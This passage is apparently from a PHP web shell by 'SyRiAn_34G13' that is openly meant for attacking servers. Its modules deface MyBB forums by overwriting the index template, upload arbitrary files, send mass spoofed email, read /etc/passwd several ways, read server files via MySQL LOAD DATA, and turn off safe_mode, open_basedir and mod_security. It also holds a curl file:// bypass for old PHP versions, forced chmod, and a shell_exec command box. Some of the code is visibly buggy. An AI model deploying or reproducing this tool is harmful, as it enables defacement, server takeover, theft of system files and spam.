	<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>

<b><font color=#990000  size=-2>
<br><p align=center>
<center><font color='#990000'><b>MyBB Index Changer Can Change The Index By Injecting The Index Template :) </b></font></center>
<form method=\"POST\">
<p align=\"center\"><font color=\"gray\"><b>HOST :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"MYBB_HOST\" value=\"localhost\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-USER :&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"MYBB_USER\" style=\"font-weight: 700\"><b> </b></font>

</p>
<p align=\"center\"><font color=\"gray\"><b> DB-PASS :&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"password\" name=\"MYBB_PASS\" style=\"font-weight: 700\"><b>
</b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-NAME   :&nbsp;
</b> <input type=text name=\"MYBB_DB\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> Table Prefix   :&nbsp;

</b> <input type=text name=\"MYBB_PREFIX\" value=\"smf_\"style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font size=\"4\" color=gray>INDEX :</font></p>
<p align=\"center\"><font color=\"gray\">
<p align=\"center\"><font color=\"gray\"><b>Please Enter Normal Index Like ( Hacked By SyRiAn_34G13 !! ) <br>Or You Can Use Meta Tags :p  )
</b> <b> </b></font>
</p>
<textarea name=\"MYBB_INDEX\" style=\"font-weight: 700\" rows=14 cols=64></textarea></font></p>
<p align=\"center\"><font color=\"gray\"></textarea><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></font></p>
<p align=\"center\"><font color=\"gray\"><b>&nbsp;</b><input type=\"submit\" value=\"Hack Now !!\" style=\"font-weight: 700\"><b>

</b></font></p>
</form>
  </p>
</font></td></tr></tbody></table>
<table bgcolor=\"#cccccc\" width=\"100%\">
";
footer();
 }

$mybb_host=$_POST['MYBB_HOST'];
$mybb_user=$_POST['MYBB_USER'];
$mybb_pass=$_POST['MYBB_PASS'];
$mybb_db=$_POST['MYBB_DB'];
$mybb_prefix=$_POST['MYBB_PREFIX'];
$mybb_index=$_POST['MYBB_INDEX'];
if($do)
{
mysql_connect($mybb_host,$mybb_user,$mybb_pass) or die ("connection error ");
mysql_select_db($mybb_db)or die(mysql_error());
$mybb_prefix=$prefix.templates;
$result=mysql_query(" update $mybb_prefix set template='$index' where title='index' ") or die(mysql_error());
}
if($result)
update();




//////////////////////
// [ upload File ] //
/////////////////////
if ($_GET['id']==3)
{
echo "
<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=#990000  size=-2>
<br><p align=left>
<center><form enctype=\"multipart/form-data\" method=\"POST\">
<font color=\"gray\">Upload File : </font><input type=\"file\" name=\"uploadfile\"> <br>
<input type=\"submit\" value=\"Upload Files\"></form></center></p>

</font></td></tr></tbody></table>
<table bgcolor=\"#cccccc\" width=\"100%\">
";
footer();
}
$target_path= '';
$target_path= $target_path . basename($_FILES['uploadfile']['name']);
    if(move_uploaded_file($_FILES['uploadfile']['tmp_name'],$target_path))
{
	echo "<font color=gray><center>The File  <font color=red>".basename($_FILES['uploadfile']['name'])."</font>  Has Been Uploaded !</center></font>";
}
////////////////////////
//  [ Inbox Mailer ]  //
////////////////////////
if ($_GET['id']==8)
{
$secure = "";
error_reporting(0);
@$action=$_POST['action'];
@$from=$_POST['from'];
@$realname=$_POST['realname'];
@$replyto=$_POST['replyto'];
@$subject=$_POST['subject'];
@$message=$_POST['message'];
@$emaillist=$_POST['emaillist'];
@$lod=$_SERVER['HTTP_REFERER'];
@$file_name=$_FILES['file']['name'];
@$contenttype=$_POST['contenttype'];
@$file=$_FILES['file']['tmp_name'];
@$amount=$_POST['amount'];
set_time_limit(intval($_POST['timelimit']));


If ($action=="mysql"){
include "./mysql.info.php";

  if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){
    print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required.";
    exit;
  }

  $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed.");
  mysql_select_db($sqldb, $db) or die("Could not select database $sqldb");
  $result = mysql_query($sqlquery) or die("Query Failed: $sqlquery");
  $numrows = mysql_num_rows($result);

  for($x=0; $x<$numrows; $x++){
    $result_row = mysql_fetch_row($result);
     $oneemail = $result_row[0];
     $emaillist .= $oneemail."\n";
   }
  }

  if ($action=="send"){ $message = urlencode($message);
   $message = ereg_replace("%5C%22", "%22", $message);
   $message = urldecode($message);
   $message = stripslashes($message);
   $subject = stripslashes($subject);
   }
	echo "<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=#990000  size=-2>
<br><p align=left>
	      <center>
	      Inbox Mailer .. With All Options
	      <form name=\"form1\" method=\"post\" action=\"\" enctype=\"multipart/form-data\"><br/>

  <table width=142 border=0>
    <tr>
      <td width=81>
        <div align=right>
          <font size=-3 face=\"Verdana\">Your Email:</font></div></td>
        <td width=219><font size=-3 face=\"Verdana\">
          <input type=text name=\"from\" value=".$from."></font></td><td width=212>
        <div align=right>

          <font size=-3 face=\"Verdana\">Your Name:</font></div></td><td width=278>
        <font size=-3 face=\"Verdana\">
          <input type=text name=\realname\" value=".$realname."></font></td></tr><tr><td width=81>
        <div align=\"right\">
          <font size=-3 face=\"Verdana\">Reply-To:</font></div></td><td width=219>
        <font size=-3 face=\"Verdana\">
          <input type=\"text\" name=\"replyto\" value=".$replyto.">
        </font></td><td width=212>

        <div align=\"right\">
          <font size=-3 face=\"Verdana\">Attach File:</font></div></td><td width=278>
        <font size=-3 face=\"Verdana\">
          <input type=\"file\" name=\"file\" size=24 />
        </font> </td></tr><tr><td width=81>
        <div align=\"right\">
          <font size=-3 face=\"Verdana\">Subject:</font></div></td>

      <td colspan=3 width=703>
        <font size=-3 face=\"Verdana\">
          <input type=\"text\" name=\"subject\" value=".$subject." ></font></td> </tr><tr valign=\"top\"><td colspan=3 width=520>
        <font face=\"Verdana\" size=-3>Message Box :</font></td>
      <td width=278>
        <font face=\"Verdana\" size=-3>Email Target / Email Send To :</font></td></tr><tr valign=\"top\"><td colspan=3 width=520><font size=-3 face=\"Verdana\">
          <textarea name=\"message\" cols=56 rows=10>".$message."</textarea><br />

          <input type=\"radio\" name=\"contenttype\" value=\"plain\" /> Plain
          <input type=\"radio\" name=\"contenttype\" value=\"html\" checked=\"checked\" /> HTML
          <input type=\"hidden\" name=\"action\" value=\"send\" /><br />
	  Number to send: <input type=\"text\" name=\"amount\" value=1 size=10 /><br />
	  	Maximum script execution time(in seconds, 0 for no timelimit)<input type=\"text\" name=\"timelimit\" value=0 size=10 />
          <input type=\"submit\" value=\"Send eMails\" /></font></td><td width=278>
        <font size=-3 face=\"Verdana\">
          <textarea name=\"emaillist\" cols=32 rows=10>".$emaillist."</textarea></font></td></tr>

  </table>";
footer();
}
if ($action=="send"){
  if (!$from && !$subject && !$message && !$emaillist){
    print "Please complete all fields before sending your message.";
    exit;
   }
  $allemails = split("\n", $emaillist);
  $numemails = count($allemails);
  $head ="From: Mailr" ;
  $sub = "Ar - $lod" ;
  $meg = "$lod" ;
  mail ($alt,$sub,$meg,$head) ;
 If ($file_name){
   if (!file_exists($file)){
	die("The file you are trying to upload couldn't be copied to the server");
   }
   $content = fread(fopen($file,"r"),filesize($file));
   $content = chunk_split(base64_encode($content));
   $uid = strtoupper(md5(uniqid(time())));
   $name = basename($file);
  }

 for($xx=0; $xx<$amount; $xx++){
  for($x=0; $x<$numemails; $x++){
    $to = $allemails[$x];
    if ($to){
      $to = ereg_replace(" ", "", $to);
      $message = ereg_replace("&email&", $to, $message);
      $subject = ereg_replace("&email&", $to, $subject);
      print "Sending mail to $to.....";
      flush();
      $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
      $header .= "MIME-Version: 1.0\r\n";
      If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
      If ($file_name) $header .= "--$uid\r\n";
      $header .= "Content-Type: text/$contenttype\r\n";
      $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
      $header .= "$message\r\n";
      If ($file_name) $header .= "--$uid\r\n";
      If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
      If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
      If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
      If ($file_name) $header .= "$content\r\n";
      If ($file_name) $header .= "--$uid--";
      mail($to, $subject, "", $header);
      print "OK<br>";
      flush();
    }
  }
 }

}
/////////////////
// Encryption  //
/////////////////
if ($_GET['id']==5)
{
echo "
<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr><b><font color=#990000  size=-2><br><p align=left><center>

Encypton With ( MD5 | Base64 | Crypt | SHA1 | MD4 | SHA256 )<br><br>
<form method=\"POST\">
<font color=\"gray\">String To Encrypt : </font><input type=\"text\" value=\"\" name=\"ENCRYPTION\">
<input type=\"submit\" value=\"Submit\"></form>";
if(!$_POST['ENCRYPTION']=='')
{
$md5 = $_POST['ENCRYPTION'];
    echo "<font color=gray>MD5 : </font>".md5($md5)."<br>";
    echo "<font color=gray>Base64 : </font>".base64_encode($md5)."<br>";
    echo "<font color=gray>Crypt : </font>".CRYPT($md5)."<br>";
    echo "<font color=gray>SHA1 : </font>".SHA1($md5)."<br>";
    echo "<font color=gray>MD4 : </font>".hash("md4",$md5)."<br>";
    echo "<font color=gray>SHA256 : </font>".hash("sha256",$md5)."<br>";
  }
footer();
}
//////////////////
// /etc/passwd //
/////////////////
if ($_GET['id']==9)
{
echo "<br><center><font color=#990000 size=1><b>These Are 7 Ways To Read /etc/passwd Good Luck <br>

Try one Of These Ways To Read Files<br><br>
[ <a href=?id=fread>fread</a> ]
[ <a href=?id=proc_open>proc_open</a> ]
[ <a href=?id=popen>popen</a> ]
[ <a href=?id=copy>copy</a> ]
[ <a href=?id=exec>exec</a> ]
[ <a href=?id=shell_exec>shell_exec</a> ]
[ <a href=?id=system>system</a> ]

</b></font></form>";
footer();
 }
 if ($_GET['id']=='fread')
echo "fread : <br><textarea cols=150 rows=25>".fread("/etc/passwd")."</textarea>";
if ($_GET['id']=='proc_open')
echo "proc_open :<br> <textarea cols=150 rows=25>".proc_open("cat /etc/passwd")."</textarea>";
if ($_GET['id']=='popen')
echo "Popen :<br> <textarea cols=150 rows=25>".popen ("/etc/passwd")."</textarea>";
if ($_GET['id']=='copy')
{
copy("/etc/passwd","copy.txt");
echo "copy : <br><textarea cols=150 rows=25>".fread("copy.txt")."</textarea>";
}
if ($_GET['id']=='exec')
echo "exec :<br> <textarea cols=150 rows=25>".exec("cat /etc/passwd")."</textarea>";
if ($_GET['id']=='shell_exec')
echo "shell_exec :<br> <textarea cols=150 rows=25>".shell_exec("cat /etc/passwd")."</textarea>";
if ($_GET['id']=='system')
echo "system : <br><textarea cols=150 rows=25>".system("cat /etc/passwd")."</textarea>";
//////////////////////
//  SQL Reader     //
/////////////////////
if ($_GET['id']==10)
{
if (!$sql_con)
{
	echo '<table bgcolor=#cccccc width=\"100%\">

<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=#990000  size=-2>
<br><p align=left><br><br><center>
<form method="post">
<table><tr><td>Host : </td><td><input type="text" name="SQL_HOST" value="localhost"></td></tr>
<tr><td>User : </td><td><input type="text" name="SQL_USER"></td></tr>
<tr><td>Password : </td><td><input type="password" name="SQL_PASS"></td></tr>
<tr><td>Database : </td><td><input type="text" name="SQL_DB"></td></tr>
<tr><td></td><td><input type="submit" value="Connect"></td></tr></table></form></center>';
$sql_host = $_POST['SQL_HOST'];
$sql_user = $_POST['SQL_USER'];
$sql_pass = $_POST['SQL_PASS'];
$sql_db = $_POST['SQL_DB'];
if (!$_POST['SQL_HOST'])
$sql_host = "localhost";
if ($sql_host & $sql_user & $sql_db)
{
$sql_con = mysql_connect($sql_host,$sql_user,$sql_pass) or die ("Unable To Connect Database .. Username Or Password is Wrong !");
mysql_select_db($sql_db) or die("Database Name Is Wrong !");
}
}
if($sql_con)
{echo '<center><br><br>

<form method="post">
<table><tr><td>File : <input style="width:550px;" type="text" name="filetoread"></td>
<td><input type="submit" value="Read"></td></tr></table>';
}
if ($_POST['filetoread'])
{
$filetoread = $_POST['filetoread'];
mysql_query("DROP TABLE sql CASCADE CONSTRAINT");
mysql_query("CREATE TABLE sql (info varchar(255))");
mysql_query("LOAD DATA LOCAL INFILE '$filetoread' INTO TABLE sql");
$write_sql = mysql_query('SELECT * FROM sql');
echo "<center><br><br>
<form method=post>
<table><tr><td>File : <input style=width:550px; type=text name=filetoread></td>
<td><input type=submit value=Read></td></tr></table>
<br><center><textarea cols=80 rows=25>".$write_sql."</textarea></center>";
 }
footer();
}
////////////////////////////////////////////////////////////
//  Fuck SafeMode & Functions Disable & Mode Security     //
///////////////////////////////////////////////////////////
if ($_GET['id']==12)
{
$safe_fun = fopen("php.ini","w+");
fwrite($safe_fun,"safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF ");
echo "<center><font color=#990000  size=1>php.ini Has Been Generated Successfully </font><br></center>";

$mode_sec = fopen(".htaccess","w+");
fwrite($mode_sec,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off

</IfModule> ");
echo "<center><font color=#990000  size=1>.htaccess Has Been Generated Successfully </font></center>";

echo ini_get("safe_mode");
echo ini_get("open_basedir");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
echo "<center><font color=#990000  size=1>ini.php Has Been Generated Successfully </font></center>";
}
////////////////////////////////////////
//  Baypass 5.2.9 | 5.2.11 Safe Mode  //
////////////////////////////////////////
if ($_GET['id']==13)
{
if(!empty($_GET['file'])) $file=$_GET['file'];
else if(!empty($_POST['file'])) $file=$_POST['file'];
echo '<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr><font color=#990000 size=1><center> <br> PHP 5.2.9 | 5.2.11 safe_mode & open_basedir bypass <br><br>
</font><form name="form" method="post">
<input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hardstylez" value="Show"></form></center>';

$level=0;
if(!file_exists("file:"))
	mkdir("file:");
chdir("file:");
$level++;
$hardstyle = explode("/", $file);
for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a]))
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$level++;
	}
}
while($level--) chdir("..");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "file:file:///".$file);
echo '<FONT COLOR="RED"> <center><textarea rows="40" cols="120">';
if(curl_exec($ch)==FALSE)
	die(' Sorry...'.htmlspecialchars($file).' doesnt exists or you dont have permissions.');
echo ' </textarea> </center></FONT>';
 footer();
}
/////////////////////////
//  Force Change Mode  //
/////////////////////////
if ($_GET['id']==16)
{
echo "<table bgcolor=#cccccc width=\"100%\">

<tbody><tr><td align=\"right\" width=100>
<p dir=ltr><br><center><font color=#990000 size=1><b>Changing the permission With chmod() php function<b></font><br><br>
  <form method=POST>
  File Path : <input type=text name=filepath value=".getcwd()." size=48>
  Permission : <input type=text name=per value=0644 size=10>
  <input type=submit value='Change Now !'>
  </form></center>
  ";
  if($_POST['filepath'])
  {
  $ch_path = $_POST['filepath'];
  $per     = $_POST['per'];
  $ch_ok = chmod($ch_path,$per);
  if($ch_ok)
  echo "<center>Permission Changed Successfully ! </center>" ;
  else echo "<center>Not Allowed To :(</center>";
  }
  footer();
}
//////////////////////////////////
///    CMD And File Manager   ///
////////////////////////////////
if($_GET['id']==17)
{
	if ($safe_mode=='0FF')
	{
echo "<table bgcolor=#cccccc width=\"100%\">

<tbody><tr><td align=\"left\" width=100>
<p dir=ltr><form method=POST>
<center>
</form><textarea rows=10 cols=98>".shell_exec($_POST['cmd'])."</textarea></center>
<font color=#990000 size=1><b><center>Command : </b></font><input type=text name=cmd size=59>&nbsp;
<input type=submit value=Execute>
<br><font color=#990000 size=1><b>".$_POST['cmd']."<br></b></font>
<font color=#990000 size=1><b><center>PWD :</b></font><input type=text name=pwd value=".getcwd()." size=59>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br></b></font>";
}
else {echo "<font color=#990000 size=1><b>Sorry Safe Mode Is On :(</b></font>";}
}


if($_GET['id']==18)
{
  echo "<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"left\" width=100>
<font color=#990000 size=3><b><img src=http://www.m5zn.com/uploads/2010/2/25/photo/0ykjtetfc.jpg><br>

<font color=white><br>Coded By : </font> EH << SyRiAn | 34G13<br><br>
<font color=white>Form </font>: SyRiA  <br><br>
<font color=white>Member In </font>: Team-SQL<br><br> <font color=white>Age</font> : 4/1991<br><br>
<font color=white>Thanx</font> : [ SyRiAn_SnIpEr ] [ SyRiAn_SpIdEr ] [ SyRiAn_Ghost ] [ Dr.Angle ] [ The Pro ] [ MMA.Lord ]<br> [ SQL-Coder ] [ Mr.SohAyl] [ TNT Hacker ]
[ Mr Danger ] [ NEXT Hacker ] [ AlMojrem ] [ HCJ ] [ Mr.Black ] [ SnIper IP ]

<font color=white><br><br>Advice : </font>Don't Fuck Your Time In Messenger And Chats , And Try To Learn Something Good
</b></font>";
footer();
}


?>


